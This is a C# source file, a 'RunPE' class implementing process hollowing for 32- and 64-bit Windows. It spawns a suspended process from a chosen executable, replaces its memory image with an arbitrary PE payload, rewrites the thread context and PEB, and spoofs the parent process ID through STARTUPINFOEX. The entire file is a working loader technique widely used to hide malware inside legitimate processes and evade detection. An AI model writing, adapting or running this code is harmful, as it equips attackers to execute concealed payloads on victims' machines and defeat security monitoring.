using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

/// <summary>
/// Process hollowing implementation for 32-bit and 64-bit process creation.
/// </summary>
public static class RunPE
{
	/// <summary>
	/// Creates a new process using the process hollowing technique.
	/// <para>The bitness of the current process, the created process and the payload must match.</para>
	/// </summary>
	/// <param name="path">The target executable path. This can be any existing file with the same bitness as the current process and <paramref name="payload" />.</param>
	/// <param name="commandLine">The commandline of the created process. This parameter is displayed in task managers, but is otherwise unused.</param>
	/// <param name="payload">The actual executable that is the payload of the new process, regardless of <paramref name="path" /> and <paramref name="commandLine" />.</param>
	/// <param name="parentProcessId">The spoofed parent process ID.</param>
	public static void Run(string path, string commandLine, byte[] payload, int parentProcessId)
	{
		// Validate PE file structure before attempting process hollowing
		if (payload == null || payload.Length < 0x40)
			throw new ArgumentException("Invalid payload: too small to be a PE file", nameof(payload));
		if (payload[0] != 'M' || payload[1] != 'Z')
			throw new ArgumentException("Invalid payload: missing DOS signature", nameof(payload));

		// For 32-bit (and 64-bit?) process hollowing, this needs to be attempted several times.
		// This is a workaround to the well known stability issue of process hollowing.
		for (int i = 0; i < 5; i++)
		{
			int processId = 0;
			IntPtr parentProcessHandlePtr = IntPtr.Zero;
			IntPtr attributeList = IntPtr.Zero;
			IntPtr startupInfo = IntPtr.Zero;
			IntPtr context = IntPtr.Zero;

			try
			{
				int ntHeaders = BitConverter.ToInt32(payload, 0x3c);
				
				// Validate NT headers offset
				if (ntHeaders < 0 || ntHeaders + 0x18 + 0x3c + 4 > payload.Length)
					throw new ArgumentException("Invalid payload: NT headers offset out of bounds", nameof(payload));

				int sizeOfImage = BitConverter.ToInt32(payload, ntHeaders + 0x18 + 0x38);
				int sizeOfHeaders = BitConverter.ToInt32(payload, ntHeaders + 0x18 + 0x3c);
				int entryPoint = BitConverter.ToInt32(payload, ntHeaders + 0x18 + 0x10);
				short numberOfSections = BitConverter.ToInt16(payload, ntHeaders + 0x6);
				short sizeOfOptionalHeader = BitConverter.ToInt16(payload, ntHeaders + 0x14);
				IntPtr imageBase = IntPtr.Size == 4 ? (IntPtr)BitConverter.ToInt32(payload, ntHeaders + 0x18 + 0x1c) : (IntPtr)BitConverter.ToInt64(payload, ntHeaders + 0x18 + 0x18);

				IntPtr parentProcessHandle = OpenProcess(0x80, false, parentProcessId);
				if (parentProcessHandle == IntPtr.Zero) throw new InvalidOperationException("Failed to open parent process");

				parentProcessHandlePtr = Allocate(IntPtr.Size);
				Marshal.WriteIntPtr(parentProcessHandlePtr, parentProcessHandle);

				IntPtr attributeListSize = IntPtr.Zero;
				if (InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref attributeListSize) || attributeListSize == IntPtr.Zero) 
					throw new InvalidOperationException("Failed to get attribute list size");

				attributeList = Allocate((int)attributeListSize);
				if (!InitializeProcThreadAttributeList(attributeList, 1, 0, ref attributeListSize) ||
					attributeList == IntPtr.Zero ||
					!UpdateProcThreadAttribute(attributeList, 0, (IntPtr)0x20000, parentProcessHandlePtr, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero)) 
					throw new InvalidOperationException("Failed to initialize proc thread attributes");

				// Use STARTUPINFOEX to implement parent process spoofing
				int startupInfoLength = IntPtr.Size == 4 ? 0x48 : 0x70;
				startupInfo = Allocate(startupInfoLength);
				Marshal.Copy(new byte[startupInfoLength], 0, startupInfo, startupInfoLength);
				Marshal.WriteInt32(startupInfo, startupInfoLength);
				Marshal.WriteIntPtr(startupInfo, startupInfoLength - IntPtr.Size, attributeList);

				byte[] processInfo = new byte[IntPtr.Size == 4 ? 0x10 : 0x18];

				context = Allocate(IntPtr.Size == 4 ? 0x2cc : 0x4d0);
				Marshal.WriteInt32(context, IntPtr.Size == 4 ? 0 : 0x30, 0x10001b);

				if (!CreateProcess(path, path + " " + commandLine, IntPtr.Zero, IntPtr.Zero, true, 0x80004, IntPtr.Zero, null, startupInfo, processInfo)) 
					throw new InvalidOperationException("Failed to create suspended process");
				processId = BitConverter.ToInt32(processInfo, IntPtr.Size * 2);
				IntPtr process = IntPtr.Size == 4 ? (IntPtr)BitConverter.ToInt32(processInfo, 0) : (IntPtr)BitConverter.ToInt64(processInfo, 0);

				NtUnmapViewOfSection(process, imageBase);

				IntPtr sizeOfImagePtr = (IntPtr)sizeOfImage;
				if (NtAllocateVirtualMemory(process, ref imageBase, IntPtr.Zero, ref sizeOfImagePtr, 0x3000, 0x40) < 0 ||
					NtWriteVirtualMemory(process, imageBase, payload, sizeOfHeaders, IntPtr.Zero) < 0) 
					throw new InvalidOperationException("Failed to allocate or write process memory");

				for (short j = 0; j < numberOfSections; j++)
				{
					// Validate section header bounds
					int sectionHeaderOffset = ntHeaders + 0x18 + sizeOfOptionalHeader + j * 0x28;
					if (sectionHeaderOffset + 0x28 > payload.Length)
						throw new ArgumentException("Section header out of bounds", nameof(payload));

					byte[] section = new byte[0x28];
					Buffer.BlockCopy(payload, sectionHeaderOffset, section, 0, 0x28);

					int virtualAddress = BitConverter.ToInt32(section, 0xc);
					int sizeOfRawData = BitConverter.ToInt32(section, 0x10);
					int pointerToRawData = BitConverter.ToInt32(section, 0x14);

					// Validate section data bounds and prevent integer overflow
					if (sizeOfRawData < 0 || pointerToRawData < 0 || 
					    pointerToRawData > payload.Length || 
					    sizeOfRawData > payload.Length - pointerToRawData)
						throw new ArgumentException("Section data out of bounds", nameof(payload));

					byte[] rawData = new byte[sizeOfRawData];
					Buffer.BlockCopy(payload, pointerToRawData, rawData, 0, rawData.Length);

					if (NtWriteVirtualMemory(process, (IntPtr)((long)imageBase + virtualAddress), rawData, rawData.Length, IntPtr.Zero) < 0) 
						throw new InvalidOperationException("Failed to write section data");
				}

				IntPtr thread = IntPtr.Size == 4 ? (IntPtr)BitConverter.ToInt32(processInfo, 4) : (IntPtr)BitConverter.ToInt64(processInfo, 8);
				if (NtGetContextThread(thread, context) < 0) throw new InvalidOperationException("Failed to get thread context");

				if (IntPtr.Size == 4)
				{
					IntPtr ebx = (IntPtr)Marshal.ReadInt32(context, 0xa4);
					if (NtWriteVirtualMemory(process, (IntPtr)((int)ebx + 8), BitConverter.GetBytes((int)imageBase), 4, IntPtr.Zero) < 0) 
						throw new InvalidOperationException("Failed to write image base to PEB");
					Marshal.WriteInt32(context, 0xb0, (int)imageBase + entryPoint);
				}
				else
				{
					IntPtr rdx = (IntPtr)Marshal.ReadInt64(context, 0x88);
					if (NtWriteVirtualMemory(process, (IntPtr)((long)rdx + 16), BitConverter.GetBytes((long)imageBase), 8, IntPtr.Zero) < 0) 
						throw new InvalidOperationException("Failed to write image base to PEB");
					Marshal.WriteInt64(context, 0x80, (long)imageBase + entryPoint);
				}

				if (NtSetContextThread(thread, context) < 0) throw new InvalidOperationException("Failed to set thread context");
				if (NtResumeThread(thread, out _) == -1) throw new InvalidOperationException("Failed to resume thread");
				
				// Success - break out of retry loop
				break;
			}
			catch
			{
				// If the current attempt failed, terminate the created process to not have suspended "leftover" processes.
				if (processId > 0)
				{
					try
					{
						Process.GetProcessById(processId).Kill();
					}
					catch { }
				}
				
				// Only retry if this isn't the last attempt
				if (i == 4) throw;
			}
			finally
			{
				// Always free allocated memory to prevent leaks
				if (parentProcessHandlePtr != IntPtr.Zero) Marshal.FreeHGlobal(parentProcessHandlePtr);
				if (attributeList != IntPtr.Zero) Marshal.FreeHGlobal(attributeList);
				if (startupInfo != IntPtr.Zero) Marshal.FreeHGlobal(startupInfo);
				if (context != IntPtr.Zero) Marshal.FreeHGlobal(context);
			}
		}
	}

	/// <summary>
	/// Allocates memory in the current process with the specified size. If this is a 64-bit process, the memory address is aligned by 16.
	/// </summary>
	/// <param name="size">The amount of memory, in bytes, to allocate.</param>
	/// <returns>An <see cref="IntPtr" /> pointing to the allocated memory.</returns>
	private static IntPtr Allocate(int size)
	{
		int alignment = IntPtr.Size == 4 ? 1 : 16;
		if (alignment == 1)
		{
			// No alignment needed for 32-bit
			return Marshal.AllocHGlobal(size);
		}
		else
		{
			// Allocate extra space for alignment, then align the pointer
			IntPtr unaligned = Marshal.AllocHGlobal(size + alignment - 1);
			return (IntPtr)(((long)unaligned + (alignment - 1)) & ~(alignment - 1));
		}
	}

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr OpenProcess(int access, bool inheritHandle, int processId);
	[DllImport("kernel32.dll")]
	private static extern bool CreateProcess(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, IntPtr startupInfo, byte[] processInformation);
	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtAllocateVirtualMemory(IntPtr process, ref IntPtr address, IntPtr zeroBits, ref IntPtr size, uint allocationType, uint protect);
	[DllImport("ntdll.dll")]
	private static extern int NtWriteVirtualMemory(IntPtr process, IntPtr baseAddress, byte[] buffer, int size, IntPtr bytesWritten);
	[DllImport("ntdll.dll")]
	private static extern uint NtUnmapViewOfSection(IntPtr process, IntPtr baseAddress);
	[DllImport("ntdll.dll")]
	private static extern int NtSetContextThread(IntPtr thread, IntPtr context);
	[DllImport("ntdll.dll")]
	private static extern int NtGetContextThread(IntPtr thread, IntPtr context);
	[DllImport("ntdll.dll")]
	private static extern int NtResumeThread(IntPtr thread, out uint suspendCount);
	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool InitializeProcThreadAttributeList(IntPtr attributeList, int attributeCount, int flags, ref IntPtr size);
	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool UpdateProcThreadAttribute(IntPtr attributeList, uint flags, IntPtr attribute, IntPtr value, IntPtr size, IntPtr previousValue, IntPtr returnSize);
}